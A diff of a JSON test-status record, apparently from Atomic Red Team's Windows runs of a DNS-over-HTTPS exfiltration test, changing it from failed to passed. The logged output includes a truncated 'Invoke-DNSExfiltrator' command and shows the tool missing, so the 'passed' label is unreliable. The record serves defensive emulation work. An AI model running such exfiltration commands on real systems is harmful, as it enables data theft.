@@ -2,12 +2,11 @@
   "guid": "c943d285-ada3-45ca-b3aa-7cd6500c6a48",
   "platforms": {
     "windows": {
-      "consecutive_failures": 1,
-      "last_status": "failed",
-      "stdout": "",
+      "consecutive_failures": 0,
+      "last_status": "passed",
+      "stdout": "PathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nCheckPrereq's for: \r\nT1048-3 DNSExfiltration (doh)\r\n\r\nPrerequisites not met: T1048-3 DNSExfiltration (doh)\r\n\t[*] DNSExfiltrator powershell file must exist on disk at specified location (D:\\a\\atomic-red-team\\atomic-red-team\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1)\r\n\r\n\r\nTry installing prereq's with the \r\n-GetPrereqs\r\n switch\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting test: \r\nT1048-3 DNSExfiltration (doh)\r\n\r\nImport-Module : The specified module 'D:\\a\\atomic-red-team\\atomic-red-team\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1' \r\nwas not loaded because no valid module file was found in any module directory.\r\nAt line:1 char:4\r\n+ & {Import-Module \"D:\\a\\atomic-red-team\\atomic-red-team\\atomics\\..\\Ext ...\r\n+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ResourceUnavailable: (D:\\a\\atomic-red...ds\\dnsexfil.ps1:String) [Import-Module], FileNot \r\n   FoundException\r\n    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand\r\n \r\nInvoke-DNSExfiltrator : The term 'Invoke-DNSExfiltrator' is not recognized as the name of a cmdlet, function, script \r\nfile, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct \r\nand try again.\r\nAt line:2 char:1\r\n+ Invoke-DNSExfiltrator -i \"D:\\a\\atomic-red-team\\atomic-red-team\\atomic ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Invoke-DNSExfiltrator:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException\r\nExit code: 0\r\nDone executing test: \r\nT1048-3 DNSExfiltration (doh)\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting cleanup for test: \r\nT1048-3 DNSExfiltration (doh)\r\n\r\nDone executing cleanup for test: \r\nT1048-3 DNSExfiltration (doh)\r\n\r\n",
       "stderr": "",
-      "exit_code": 1,
-      "last_error": "The process cannot access the file 'C:\\Users\\runneradmin\\AppData\\Local\\Temp\\tmpwoqozk.tmp' because it is being used by another process."
+      "exit_code": 0
     }
   }
 }
